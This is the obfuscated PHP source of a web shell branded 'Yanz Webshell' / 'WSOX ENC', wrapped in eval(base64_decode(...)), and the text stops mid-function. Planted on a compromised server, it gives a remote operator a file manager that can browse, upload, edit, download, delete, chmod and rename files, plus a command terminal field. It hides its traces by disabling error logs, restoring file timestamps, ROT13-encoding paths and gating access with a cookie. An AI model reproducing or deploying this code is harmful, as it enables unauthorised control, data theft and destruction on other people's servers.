<?php 
echo eval('?>'.base64_decode("<?php 
@set_time_limit(0);
error_reporting(0);

if (fUnctIOn_EXiSTS("ini_set")) {
    @iNi_set("error_log", null);
    @inI_sEt("log_errors", (int) round(0 + 0 + 0));
    @Ini_set("max_execution_time", 01153 - 01153);
}
if (fUNCTiOn_ExIsTs("set_magic_quotes_runtime")) {
    if (vErsiOn_cOmpaRe(phPVersIon(), "5.4.0", "<")) {
        magic_quotes_runtime((int) round(0 + 0 + 0));
    }
}
class _pps
{
    public $hsh;
    public $_i;
    public $_taj;
    public $_hej;
    public $_cp;
    public $_za;
    public $_zrt;
    public $_wda;
    public $_vpb;
    public $_vor;
    function seTCoOk($_gtq, $_e)
    {
        $_COOKIE[$_gtq] = $_e;
        SeTcOOkie($_gtq, $_e);
    }
    function afterlogiN()
    {
        $this->hsh = "fa704e7366d666bd";
        $this->_i = "_" . sUbSTr(mD5($_SERVER["HTTP_HOST"]), -056 - -0152 - 074, 075 + 0146 + -0240);
        $this->_taj = "#df5";
        $this->_hej = "Windows-1251";
        if (!@isset($_COOKIE[$this->_i]) || $_COOKIE[$this->_i] != $this->hsh) {
            $this->SetcOoK($this->_i, $this->hsh);
        }
    }
    function sTArTUP()
    {
        if (FUNCTION_exiSTS("ini_get")) {
            $_vpb = @INI_geT("safe_mode");
            $_cp = @INi_geT("disable_functions");
        }
        if (!$_vpb && FUNCTion_ExiSts("error_reporting")) {
            ERRoR_rePoRTINg((int) round(0 + 0));
        }
        if (!$_vpb && FUnCTIOn_ExIsTs("set_time_limit")) {
            seT_tIME_limit((int) round(0 + 0));
        }
        if (fUNctIoN_eXiSTs("get_magic_quotes_gpc") && fuNCTIon_ExIStS("array_map") && fUNcTiOn_eXiSts("stripslashes") && funCTion_exIstS("is_array")) {
            if (@GeT_maGIC_quOtEs_gPC()) {
                function WSS($_a)
                {
                    return @Is_arraY($_a) ? @ArRAY_MAp("WSS", $_a) : @STRIPslAshEs($_a);
                }
                $_POST = WSs($_POST);
                $_COOKIE = wss($_COOKIE);
            }
        }
        if (!FUnCtiON_EXIsts("posix_getpwuid") && StrPOS($_cp, "posix_getpwuid") === false) {
            function pOSiX_GeTpwUid($_l)
            {
                return false;
            }
        }
        if (!FUncTIoN_ExisTS("posix_getgrgid") && StRPos($_cp, "posix_getgrgid") === false) {
            function POsIx_GetgRgid($_l)
            {
                return false;
            }
        }
        if (StRtOlowER(suBSTr(PHP_OS, 01200 + -01200, (int) round(1.5 + 1.5))) == "win") {
            $_vor = "win";
        } else {
            $_vor = "nix";
        }
        $_wda = $_SERVER["DOCUMENT_ROOT"];
        if (FUnctiOn_exIStS("getcwd")) {
            $_zrt = @GeTcwD();
        } else {
            $_zrt = @DIRname(__FILE__);
        }
        if (isset($_POST["c"]) && $_POST["c"] != "") {
            $_POST["c"] = STR_ROt13($_POST["c"]);
        }
        if (isset($_POST["c"])) {
            if (FunCTion_EXisTs("chdir")) {
                @CHDir($_POST["c"]);
            }
        }
        if (FuNCtION_eXiSTS("getcwd")) {
            $_za = @GeTcwd();
        } elseif (@isset($_POST["c"]) && $_POST["c"] != "") {
            $_za = $_POST["c"];
        } else {
            $_za = $_zrt;
        }
        if ($_vor == "win") {
            $_zrt = Str_REPlAcE("\\", "/", $_zrt);
            $_za = StR_rEplaCE("\\", "/", $_za);
        }
        if ($_za[Strlen($_za) - (0577 - -0621 - 01417)] != "/") {
            $_za .= "/";
        }
        $this->_cp = $_cp;
        $this->_za = $_za;
        $this->_zrt = $_zrt;
        $this->_wda = $_wda;
        $this->_vpb = $_vpb;
        $this->_vor = $_vor;
    }
    function ActloGOuT()
    {
        $_i = $this->_i;
        SETCOokIE($_i, "", TimE() - (int) round(1800 + 1800));
        die("bye!");
    }
    function aCtFm()
    {
        $_za = $this->_za;
        if (!empty($_POST["p"])) {
            $_ozl = @FiLEMTIme($_POST["c"]);
            switch ($_POST["p"]) {
                case "uploadFile":
                    if (!@MoVE_UPLOADeD_FIle($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
                        echo "Can't upload file!";
                    } elseif ($_ozl) {
                        @tOUcH($_FILES["f"]["name"], $_ozl, $_ozl);
                    }
                    break;
                case "mkdir":
                    if (!@mKDir(stR_roT13($_POST["x"]))) {
                        echo "Can't create new dir";
                    } elseif ($_ozl) {
                        @TOucH(StR_Rot13($_POST["x"]), $_ozl, $_ozl);
                    }
                    break;
                case "delete":
                    function DELETedIR($_we)
                    {
                        $_we = suBStr($_we, -(int) round(0.5 + 0.5)) == "/" ? $_we : $_we . "/";
                        if ($_hcf = @oPEnDIR($_we)) {
                            while (($_nos = @reaDDIr($_hcf)) !== false) {
                                $_nos = $_we . $_nos;
                                if (@bAseName($_nos) == ".." || @BASENAmE($_nos) == ".") {
                                    continue;
                                }
                                $_ei = @fIletYPe($_nos);
                                if ($_ei == "dir") {
                                    DeLEtedIR($_nos);
                                } else {
                                    @uNLink($_nos);
                                }
                            }
                            @CLOsedir($_hcf);
                        }
                        @RMdir($_we);
                    }
                    if (@Is_ARrAY($_POST["f"])) {
                        foreach ($_POST["f"] as $_rb) {
                            if ($_rb == "..") {
                                continue;
                            }
                            $_rb = STR_ROt13(URLdECodE($_rb));
                            if (@is_diR($_rb)) {
                                dElETEdIr($_rb);
                            } else {
                                @uNlInk($_rb);
                            }
                        }
                    }
                    break;
            }
            if ($_ozl) {
                ToUcH($_POST["c"], $_ozl, $_ozl);
            }
        }
        echo "<h1>File manager</h1><div class=content><script>p_=x_=s_=\"\";</script>";
        $_wb = WsCanDir(@isset($_POST["c"]) ? $_POST["c"] : $_za);
        if ($_wb === false) {
            echo "Can't open this folder!";
            return;
        }
        global $_rpl;
        $_rpl = array("name", -0263 + -034 - -0320);
        if (!empty($_POST["p"])) {
            if (@pReg_matCH("!s_([A-z]+)_(\\d{1})!", $_POST["p"], $_tf)) {
                $_rpl = array($_tf[0402 + -0135 - 0244], (int) $_tf[0407 - 0405]);
            }
        }
        echo "<script>function sa(){for(i=0;i<d.files.elements.length;i++)if(d.files.elements[i].type=='checkbox')d.files.elements[i].checked=d.files.elements[0].checked;}</script><table width='100%' class='main' cellspacing='0' cellpadding='2'><form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th width='40%'><a href='#' onclick='g(\"fm\",null,\"s_name_" . ($_rpl[(int) round(0.33333333333333 + 0.33333333333333 + 0.33333333333333)] ? (int) round(0 + 0 + 0) : (int) round(0.33333333333333 + 0.33333333333333 + 0.33333333333333)) . "\")'>Name</a></th><th><a href='#' onclick='g(\"fm\",null,\"s_size_" . ($_rpl[(int) round(0.33333333333333 + 0.33333333333333 + 0.33333333333333)] ? -0561 - -0373 - -0166 : 01230 - 01227) . "\")'>Size</a></th><th><a href='#' onclick='g(\"fm\",null,\"s_modify_" . ($_rpl[(int) round(0.5 + 0.5)] ? (int) round(0 + 0) : 01 - 00) . "\")'>Modify</a></th><th><a href='#' onclick='g(\"fm\",null,\"s_perms_" . ($_rpl[(int) round(0.5 + 0.5)] ? (int) round(0 + 0) : (int) round(0.5 + 0.5)) . "\")'>Permissions</a></th><th width='200px'>Actions</th></tr>";
        $_q = $_vgl = array();
        $_t = COUNt($_wb);
        for ($_o = (int) round(0 + 0 + 0); $_o < $_t; $_o++) {
            $_j = array("name" => $_wb[$_o], "path" => $_za . $_wb[$_o], "modify" => @DATE("Y-m-d H:i:s", @FIleMTimE($_za . $_wb[$_o])), "perms" => WpERMsCOlOR($_za . $_wb[$_o]), "size" => @FILesize($_za . $_wb[$_o]));
            if (@is_fIlE($_za . $_wb[$_o])) {
                $_vgl[] = @arRay_mERgE($_j, array("type" => "file"));
            } elseif (@IS_LiNK($_za . $_wb[$_o])) {
                $_q[] = @ARray_merGE($_j, array("type" => "link", "link" => ReADLInK($_j["path"])));
            } elseif (@IS_DIR($_za . $_wb[$_o])) {
                $_q[] = @ARraY_mErGe($_j, array("type" => "dir"));
            }
        }
        function wcmP($_snp, $_jy)
        {
            global $_rpl;
            if ($_rpl[0215 - 0215] != "size") {
                return @StRcMP(STrToLOwer($_snp[$_rpl[-0236 - -0236]]), strtOlowEr($_jy[$_rpl[0155 + -0142 + -013]])) * ($_rpl[(int) round(0.5 + 0.5)] ? (int) round(0.33333333333333 + 0.33333333333333 + 0.33333333333333) : -(-0465 - -0466));
            } else {
                return ($_snp["size"] < $_jy["size"] ? -(0601 - 0600) : (int) round(0.5 + 0.5)) * ($_rpl[(int) round(0.5 + 0.5)] ? 0312 + -0227 + -062 : -(017 - 016));
            }
        }
        @UsORt($_vgl, "wCmp");
        @Usort($_q, "wCmp");
        $_vgl = @ArrAY_MERGE($_q, $_vgl);
        $_fl = 0545 - 0277 - 0246;
        foreach ($_vgl as $_rb) {
            $_fc = StR_rot13(urLeNcodE($_rb["name"]));
            echo "<tr" . ($_fl ? " class=l1" : "") . "><td><input type=checkbox name=\"f[]\" value=\"" . $_fc . "\" class=chkbx></td><td><a href=# onclick=\"" . ($_rb["type"] == "file" ? "g('ft',null,'" . $_fc . "', 'view')\">" . htmLSpeciAlChARS($_rb["name"]) : "g('fm','" . Str_RoT13($_rb["path"]) . "');\" " . (empty($_rb["link"]) ? "" : "title='" . $_rb["link"] . "'") . "><b>[ " . hTmLspecialchars($_rb["name"]) . " ]</b>") . "</a></td><td>" . ($_rb["type"] == "file" ? viEwsIze($_rb["size"]) : $_rb["type"]) . "</td><td>" . $_rb["modify"] . "</td><td><a href=# onclick=\"g('ft',null,'" . $_fc . "','chmod')\">" . $_rb["perms"] . "</td><td><a href=\"#\" onclick=\"g('ft',null,'" . $_fc . "', 'rename')\">Rename</a> <a href=\"#\" onclick=\"g('ft',null,'" . $_fc . "', 'touch')\">Touch</a>" . ($_rb["type"] == "file" ? " <a href=\"#\" onclick=\"g('ft',null,'" . $_fc . "', 'edit')\">Edit</a> <a href=\"#\" onclick=\"g('ft',null,'" . $_fc . "', 'download')\">Download</a>" : "") . "</td></tr>";
            $_fl = $_fl ? -0742 + 0742 : -0753 - -0754;
        }
        echo "<tr><td colspan=7>\r\n\t\t<input type=hidden name=a value='fm'>\r\n\t\t<input type=hidden name=c value='" . HtMlSPEcialChArS(sTr_ROT13($_za)) . "'>\r\n\t\t<input type=hidden name=ch value='" . (@isset($_POST["ch"]) ? $_POST["ch"] : "") . "'>\r\n\t\t<select name='p'><option value='delete'>Delete</option></select>&nbsp;<input type='submit' value='>>'></td></tr></form></table></div>";
    }
    function ACtFt()
    {
        $_cp = $this->_cp;
        if (@isset($_POST["p"])) {
            $_POST["p"] = STr_ROt13(UrLDecOdE($_POST["p"]));
        }
        if (@isset($_POST["x"])) {
            switch ($_POST["x"]) {
                case "download":
                    if (@Is_FIle($_POST["p"]) && @IS_READaBle($_POST["p"])) {
                        OB_StART("ob_gzhandler", (int) round(2048 + 2048));
                        @heaDEr("Content-Disposition: attachment; filename=" . @BAsENAMe($_POST["p"]));
                        if (FUnctIOn_EXiSTs("mime_content_type")) {
                            $_ei = @MimE_ConTeNt_TypE($_POST["p"]);
                            @heADEr("Content-Type: " . $_ei);
                        } else {
                            @HeAder("Content-Type: application/octet-stream");
                        }
                        $_jj = @FOpEn($_POST["p"], "r");
                        if ($_jj) {
                            while (!@FeOF($_jj)) {
                                echo @FGeTs($_jj, 01013 - 0702 + 01667);
                            }
                            @FClose($_jj);
                        }
                    }
                    exit;
                    break;
                case "mkfile":
                    if (!@FILE_exiStS($_POST["p"])) {
                        $_x = @fIlEMTImE($_POST["c"]);
                        $_jj = @fOpeN($_POST["p"], "w");
                        if ($_jj) {
                            @fCLoSe($_jj);
                            if ($_x) {
                                @touCH($_POST["c"], $_x, $_x);
                                @toUCh($_POST["p"], $_x, $_x);
                            }
                            $_POST["x"] = "edit";
                        }
                    }
                    break;
            }
        }
        echo "<h1>File tools</h1><div class=content>";
        if (!@fiLE_ExisTs($_POST["p"])) {
            echo "File not exists";
            return;
        }
        $_bhr = @Posix_Getpwuid(@FiLeowNEr($_POST["p"]));
        if (!$_bhr) {
            $_bhr["name"] = @FiLEoWNER($_POST["p"]);
            $_hs["name"] = @fILEGrOUp($_POST["p"]);
        } else {
            $_hs = @PosIx_gEtGRgiD(@FILEGROUp($_POST["p"]));
        }
        echo "<span>Name:</span> " . htMLSpeciaLcHArs(@BaSenAMe($_POST["p"])) . " <span>Size:</span> " . (@iS_FILe($_POST["p"]) ? vIewSize(@fILESIze($_POST["p"])) : "-") . " <span>Permission:</span> " . WPeRMScOLoR($_POST["p"]) . " <span>Owner/Group:</span> " . $_bhr["name"] . "/" . $_hs["name"] . "<br>";
        echo "<span>Change time:</span> " . @dATe("Y-m-d H:i:s", @fileCtIme($_POST["p"])) . " <span>Access time:</span> " . @DaTE("Y-m-d H:i:s", @FiLeaTime($_POST["p"])) . " <span>Modify time:</span> " . @daTe("Y-m-d H:i:s", @FilEmTime($_POST["p"])) . "<br><br>";
        if (empty($_POST["x"])) {
            $_POST["x"] = "view";
        }
        if (@IS_File($_POST["p"])) {
            $_fbd = array("View", "Download", "Edit", "Chmod", "Rename", "Touch");
        } else {
            $_fbd = array("Chmod", "Rename", "Touch");
        }
        foreach ($_fbd as $_e) {
            echo "<a href=# onclick=\"g(null,null,'" . UrlenCOdE(StR_rOt13($_POST["p"])) . "','" . @STrTolowER($_e) . "')\">" . (@strToLOweR($_e) == $_POST["x"] ? "<b>[ " . $_e . " ]</b>" : $_e) . "</a> ";
        }
        echo "<br><br>";
        switch ($_POST["x"]) {
            case "view":
                echo "<pre class=ml1>";
                $_jj = @foPEN($_POST["p"], "r");
                if ($_jj) {
                    while (!@fEof($_jj)) {
                        echo HtmlsPECiAlcHArs(@FGets($_jj, (int) round(341.33333333333 + 341.33333333333 + 341.33333333333)));
                    }
                    @fcloSe($_jj);
                }
                echo "</pre>";
                break;
            case "chmod":
                if (!empty($_POST["s"])) {
                    $_jfl = -077 + -021 - -0120;
                    for ($_o = STRlEn($_POST["s"]) - (int) round(0.5 + 0.5); $_o >= -0265 - 0637 - -01124; --$_o) {
                        $_jfl += (int) $_POST["s"][$_o] * @pOw((int) round(2.6666666666667 + 2.6666666666667 + 2.6666666666667), StRLen($_POST["s"]) - $_o - (int) round(0.33333333333333 + 0.33333333333333 + 0.33333333333333));
                    }
                    if (!@ChmOd($_POST["p"], $_jfl)) {
                        echo "Can't set permissions!<br><script>document.mf.s.value=\"\";</script>";
                    }
                }
                @cLeaRStATCACHe();
                echo "<script>s_=\"\";</script><form onsubmit=\"g(null,null,'" . URlENCode(sTR_rOT13($_POST["p"])) . "',null,this.chmod.value);return false;\"><input type=text name=chmod value=\"" . suBstR(@sprInTf("%o", @FIlePErMs($_POST["p"])), -(int) round(2 + 2)) . "\"><input type=submit value=\">>\"></form>";
                break;
            case "edit":
                if (!@IS_wrItAble($_POST["p"])) {
                    echo "File isn't writeable";
                    break;
                }
                if (!empty($_POST["s"])) {
                    $_ozl = @FilEmtiMe($_POST["p"]);
                    $_POST["s"] = suBStR($_POST["s"], (int) round(0.5 + 0.5));
                    $_POST["s"] = @base64_DeCOde($_POST["s"]);
                    $_jj = @foPEN($_POST["p"], "w");
                    if ($_jj) {
                        @fputs($_jj, $_POST["s"]);
                        @FCLoSe($_jj);
                        echo "Saved!<br><script>s_=\"\";</script>";
                    }
                }
                echo "<form onsubmit=\"g(null,null,'" . urLenCodE(stR_rOt13($_POST["p"])) . "','edit','1'+utoa(this.text.value));return false;\"><textarea name=text class=bigarea>";
                $_jj = @FOpeN($_POST["p"], "r");
                if ($_jj) {
                    while (!@fEOF($_jj)) {
                        echo HtmlsPECiaLchARs(@fgEts($_jj, (int) round(341.33333333333 + 341.33333333333 + 341.33333333333)));
                    }
                    @FcLosE($_jj);
                }
                echo "</textarea><input type=submit value=\"Save\"></form>";
                if ($_ozl) {
                    @TOucH($_POST["p"], $_ozl, $_ozl);
                }
                @CLEarSTATCachE();
                break;
            case "rename":
                $_x = @fiLEmtIME($_POST["c"]);
                if (!empty($_POST["s"])) {
                    if (!@rEnaME($_POST["p"], STR_Rot13($_POST["s"]))) {
                        echo "Can't rename!<br>";
                    } else {
                        if ($_x) {
                            @TOuCH($_POST["c"], $_x, $_x);
                        }
                        die("<script>g(null,null,\"" . UrlENcOde($_POST["s"]) . "\",null,\"\")</script>");
                    }
                }
                @CleaRSTatCacHe();
                echo "<form onsubmit=\"g(null,null,'" . URlenCoDe(STR_RoT13($_POST["p"])) . "',null,rot13(this.name.value));return false;\"><input type=text name=name value=\"" . HTMLSpecIAlChARS($_POST["p"]) . "\"><input type=submit value=\">>\"></form>";
                break;
            case "touch":
                if (!empty($_POST["s"])) {
                    $_ozl = @StrToTiMe($_POST["s"]);
                    if ($_ozl) {
                        if (!@TouCH($_POST["p"], $_ozl, $_ozl)) {
                            echo "Fail!";
                        } else {
                            echo "Touched!";
                        }
                    } else {
                        echo "Bad time format!";
                    }
                }
                @cLEarStatcaCHe();
                echo "<script>s_=\"\";</script><form onsubmit=\"g(null,null,'" . URlenCOdE(STR_rOt13($_POST["p"])) . "',null,this.touch.value);return false;\"><input type=text name=touch value=\"" . @daTe("Y-m-d H:i:s", @fiLemTImE($_POST["p"])) . "\"><input type=submit value=\">>\"></form>";
                break;
        }
        echo "</div>";
    }
    function wheADeR()
    {
        $_taj = $this->_taj;
        $_hej = $this->_hej;
        $_za = $this->_za;
        $_zrt = $this->_zrt;
        $_wda = $this->_wda;
        $_i = $this->_i;
        $_vpb = $this->_vpb;
        $_vor = $this->_vor;
        if (empty($_POST["ch"])) {
            $_POST["ch"] = $_hej;
        }
        echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST["ch"] . "'><title>" . $_SERVER["HTTP_HOST"] . " - WSOX ENC</title>\r\n\t\t<style>body{background-color:#444;color:#e1e1e1;}body,td,th{font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1;}table.info{color:#fff;background-color:#222;}span,h1,a{color: " . $_taj . " !important;}span{font-weight: bolder;}span.wfw{font-weight:normal;}h1{border-left:5px solid " . $_taj . ";padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px;}div.content{padding: 5px;margin-left:5px;background-color:#333;}a{text-decoration:none;}a:hover{text-decoration:underline;}.ml1{border:1px solid #444;padding:5px;margin:0;overflow: auto;}.bigarea{width:100%;height:300px;}input,textarea,select{margin:0;color:#fff;background-color:#555;border:1px solid " . $_taj . "; font: 9pt Monospace,'Courier New';}form{margin:0px;}#toolsTbl{text-align:center;}.toolsInp{width:500px}.main th{text-align:left;background-color:#5e5e5e;}.main tr:hover{background-color:#5e5e5e}.l1{background-color:#444}.l2{background-color:#333}pre{font-family:Courier,Monospace;}</style>\r\n<script>\r\nvar c_ = '" . htmlsPECiaLcHarS(Str_RoT13($_za)) . "';\r\nvar a_ = '" . hTMLSpeCIALcHarS($_POST["a"]) . "'\r\nvar ch_ = '" . hTmlsPecialChArs($_POST["ch"]) . "';\r\nvar p_ = '" . (STRpos($_POST["p"], "\n") !== false ? "" : HtMLSPeciALCHARs($_POST["p"], (int) round(1.5 + 1.5))) . "';\r\nvar x_ = '" . (StrpOS($_POST["x"], "\n") !== false ? "" : HtMlspecIALcHARS($_POST["x"], 0270 - 0265)) . "';\r\nvar s_ = '" . (STrpos($_POST["s"], "\n") !== false ? "" : htmlSPEciALCharS($_POST["s"], -0315 + -0436 - -0756)) . "';\r\nvar d = document;\r\nfunction set(a,c,p,x,s,ch){if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;if(p!=null)d.mf.p.value=p;else d.mf.p.value=p_;if(x!=null)d.mf.x.value=x;else d.mf.x.value=x_;if(s!=null)d.mf.s.value=s;else d.mf.s.value=s_;if(ch!=null)d.mf.ch.value=ch;else d.mf.ch.value=ch_;}function g(a,c,p,x,s,ch){set(a,c,p,x,s,ch);d.mf.submit();}function utoa(str){return window.btoa(unescape(encodeURIComponent(str)));}function atou(str){return decodeURIComponent(escape(window.atob(str)));}function rot13(str){var input='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; var output='NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'; var index=x=> input.indexOf(x); var translate=x=> index(x) > -1 ? output[index(x)] : x; return str.split('').map(translate).join('');}var cvis=false;function show(){if(!cvis){document.getElementById('bat').innerHTML='Links';document.getElementById('cwd').style.display='inline';document.getElementById('links').style.display='none';cvis=true;}else{document.getElementById('bat').innerHTML='Text';document.getElementById('cwd').style.display='none';document.getElementById('links').style.display='inline';cvis=false;}}\r\n</script>\r\n</head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>\r\n<form method=post name=mf style='display:none;'>\r\n<input type=hidden name=a>\r\n<input type=hidden name=c>\r\n<input type=hidden name=p>\r\n<input type=hidden name=x>\r\n<input type=hidden name=s>\r\n<input type=hidden name=ch>\r\n</form>";
        if (FUncTIon_exISTs("diskfreespace")) {
            $_pn = @dISkfREEspAce($_za);
        }
        if (FUnCTIOn_ExiSTs("disk_total_space")) {
            $_ejl = @dISk_toTAL_SPACE($_za);
        }
        $_ejl = $_ejl ? $_ejl : (int) round(0.5 + 0.5);
        if (fUncTiOn_eXISTs("php_uname")) {
            $_v = @php_UnAME();
        } elseif (funCTIon_ExiSTs("phpinfo")) {
            Ob_STArt();
            PHpiNfO();
            $_no = ob_Get_CLEAn();
            if (false !== preG_mAtch("!<tr><td class=\"e\">System\\s*</td><td class=\"v\">([^\\<]+)!i", $_no, $_bf)) {
                $_v = tRIm($_bf[025 + 027 - 053]);
            }
        }
        $_bl = "";
        $_we = @exPLOdE("/", $_za);
        $_t = cOuNt($_we);
        for ($_o = (int) round(0 + 0); $_o < $_t - (01041 - 01040); $_o++) {
            $_bl .= "<a href='#' onclick='g(\"fm\",\"";
            for ($_el = -0630 - -0300 + 0330; $_el <= $_o; $_el++) {
                $_bl .= STR_roT13($_we[$_el]) . "/";
            }
            $_bl .= "\",\"\",\"\")'>" . $_we[$_o] . "/</a>";
        }
        $_cw = array("UTF-8", "Windows-1251", "KOI8-R", "KOI8-U", "cp866");
        $_n = "";
        foreach ($_cw as $_nos) {
            $_n .= "<option value=\"" . $_nos . "\" " . ($_POST["ch"] == $_nos ? "selected" : "") . ">" . $_nos . "</option>";
        }
        $_fbd = array("Files" => "fm");
        if (!empty($_COOKIE[$_i])) {
            $_fbd["Logout"] = "Logout";
        }
        $_h = "";
        foreach ($_fbd as $_gtq => $_e) {
            $_h .= "<th width=\"" . (int) ((int) round(50 + 50) / coUnt($_fbd)) . "%\">[ <a href=\"#\" onclick=\"g('" . $_e . "',null,'','','')\">" . $_gtq . "</a> ]</th>";
        }
        $_dej = "";
        if ($_vor == "win") {
            foreach (@Range("c", "z") as $_szx) {
                if (@Is_dIr($_szx . ":\\")) {
                    $_dej .= "<a href=\"#\" onclick=\"g('fm','" . STr_roT13($_szx) . ":/')\">[ " . $_szx . " ]</a> ";
                }
            }
        }
        $_uy = $_SERVER["SERVER_ADDR"];
        if (empty($_uy)) {
            $_uy = GeThoSTbyName($_SERVER["SERVER_NAME"]);
        }
        echo "<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span><font color=red>Attention:</font><br>Uname:<br>Php:<br>Hdd:<br>Cwd:" . ($_vor == "win" ? "<br>Drives:" : "") . "</span></td>" . "<td><a href='#'</a><u><b>Yanz Webshell!</b> - PRIV8 WEB SHELL ORB YANZ BYPASS!</u></a><br><nobr>" . ($_v ? subsTr($_v, -01 + 01, (int) round(40 + 40 + 40)) : "N/A") . "</nobr><br>" . @pHPversiON() . " <span>Safe mode:</span> " . ($_vpb ? "<font color=red>ON</font>" : "<font color=green><b>OFF</b></font>") . " <span>Datetime:</span> " . daTE("Y-m-d H:i:s") . "<br>" . ($_ejl ? vIewSIZe($_ejl) : "") . " <span>Free:</span> " . ($_pn ? vIewSiZe($_pn) : "") . " (" . ($_pn && $_ejl ? (int) ($_pn / $_ejl * (0157 + 0136 - 0151)) : "0") . "%)<br><span id=\"links\" class=\"wfw\">" . $_bl . " " . WPerMSCOLOr($_za) . " <a href=# onclick=\"g('fm','" . STr_rot13($_wda) . "','','','')\">[ root ]</a> <a href=# onclick=\"g('fm','" . Str_rOT13($_zrt) . "','','','')\">[ home ]</a></span><span id=\"cwd\" style=\"display: none;\" class=\"wfw\"><input size=" . (STrlen($_za) + (int) round(11 + 11)) . " type=text value=\"" . $_za . "\"></span> <a href=# onclick=\"show();\"><font color=#fff id=\"bat\">Text</font></a><br>" . $_dej . "</td>" . "<td width=1 align=right><nobr><select onchange=\"g(null,null," . (!empty($_POST["p"]) ? "'" . $_POST["p"] . "'" : "null") . ",null,null,this.value)\"><optgroup label=\"Page charset\">" . $_n . "</optgroup></select><br><span>Server IP:</span><br>" . $_uy . "<br><span>Client IP:</span><br>" . $_SERVER["REMOTE_ADDR"] . "</nobr></td></tr></table>" . "<table style=\"border-top:2px solid #333;\" cellpadding=3 cellspacing=0 width=100%><tr>" . $_h . "</tr></table><div style=\"margin:5\">";
    }
    function wfOotER()
    {
        $_za = $this->_za;
        $_lia = @is_WrItabLe($_za) ? " <font color='green'>(Writeable)</font>" : " <font color=red>(Not writable)</font>";
        echo "</div><table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'><tr><td><form onsubmit='g(null,rot13(this.c.value),\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . HtMlSpeCiaLcHArS($_za) . "'><input type=submit value='>>'></form></td><td><form onsubmit=\"g('ft',null,rot13(this.f.value));return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td></tr><tr><td><form onsubmit=\"g('fm',null,'mkdir',rot13(this.d.value));return false;\"><span>Make dir:</span>" . $_lia . "<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td><td><form onsubmit=\"g('ft',null,rot13(this.f.value),'mkfile');return false;\"><span>Make file:</span>" . $_lia . "<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td></tr><tr><td><form onsubmit=\"g('ce',null,utoa(this.c.value));return false;\"></a></form><form method=post ><span>Terminal:</span><br><input class='toolsInp' type=text name=command value='' autocomplete='off'><input type=submit value='>>' name='subcmd'></form></td><span></td><td><form method='post' ENCTYPE='multipart/form-data'><input type=hidden name=a value='fm'><input type=hidden name=c value='" . sTr_RoT13($_za) . "'><input type=hidden name=p value='uploadFile'><input type=hidden name=ch value='" . (@isset($_POST["ch"]) ? $_POST["ch"] : "") . "'><span>Upload file:</span>" . $_lia . "<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td></tr></table></div></body></html>";
    }
}
function vIewSIze($_xwm, $_yj = null)
{
    if (iS_INt($_xwm)) {
        $_xwm = @spRINtf("%u", $_xwm);
    }
    if ($_xwm >= (int) round(357913941.33333 + 357913941.33333 + 357913941.33333)) {
        return @spRINtf("%1.2f", $_xwm / (010000001240 + -01240)) . " GB";
    } elseif ($_xwm >= 03777073 - 04000560 + 04001465) {
        return @SprinTF("%1.2f", $_xwm / (int) round(349525.33333333 + 349525.33333333 + 349525.33333333)) . " MB";
    } elseif ($_xwm >= (int) round(512 + 512)) {
        return @sPRinTf("%1.2f", $_xwm / (int) round(341.33333333333 + 341.33333333333 + 341.33333333333)) . " KB";
    } else {
        return $_xwm . " B";
    }
}
function WPerMs($_l)
{
    if (($_l & 0140371 - 0137733 + 0137342) == 0137615 - -0163) {
        $_o = "s";
    } elseif (($_l & (int) round(20480 + 20480)) == 0117774 - -04) {
        $_o = "l";
    } elseif (($_l & (int) round(10922.666666667 + 10922.666666667 + 10922.666666667)) == 0100270 + -0270) {
        $_o = "-";
    } elseif (($_l & (int) round(8192 + 8192 + 8192)) == (int) round(12288 + 12288)) {
        $_o = "b";
    } elseif (($_l & (int) round(8192 + 8192)) == 037655 - 040121 - -040244) {
        $_o = "d";
    } elseif (($_l & (int) round(2730.6666666667 + 2730.6666666667 + 2730.6666666667)) == 017574 + 0204) {
        $_o = "c";
    } elseif (($_l & (int) round(1365.3333333333 + 1365.3333333333 + 1365.3333333333)) == 010110 + -0110) {
        $_o = "p";
    } else {
        $_o = "u";
    }
    $_o .= $_l & 0752 + 044 - 0416 ? "r" : "-";
    $_o .= $_l & (int) round(42.666666666667 + 42.666666666667 + 42.666666666667) ? "w" : "-";
    $_o .= $_l & -01223 - -01323 ? $_l & (int) round(682.66666666667 + 682.66666666667 + 682.66666666667) ? "s" : "x" : ($_l & 05014 + 04725 + -05741 ? "S" : "-");
    $_o .= $_l & -01044 - -01104 ? "r" : "-";
    $_o .= $_l & 020 + 022 - 022 ? "w" : "-";
    $_o .= $_l & (int) round(2.6666666666667 + 2.6666666666667 + 2.6666666666667) ? $_l & 01564 + 01365 + -01151 ? "s" : "x" : ($_l & (int) round(512 + 512) ? "S" : "-");
    $_o .= $_l & (int) round(1.3333333333333 + 1.3333333333333 + 1.3333333333333) ? "r" : "-";
    $_o .= $_l & (int) round(0.66666666666667 + 0.66666666666667 + 0.66666666666667) ? "w" : "-";
    $_o .= $_l & 0106 - 0105 ? $_l & (int) round(170.66666666667 + 170.66666666667 + 170.66666666667) ? "t" : "x" : ($_l & 0765 + 0470 - 0455 ? "T" : "-");
    return $_o;
}
function wpERmsCOlor($_rb)
{
    if (!@is_rEAdaBLE($_rb)) {
        return "<font color=#FF0000>" . wPErms(fILEpERMs($_rb)) . "</font>";
    } elseif (!@iS_WRItabLE($_rb)) {
        return "<font color=white>" . wPERms(FIlEperMS($_rb)) . "</font>";
    } else {
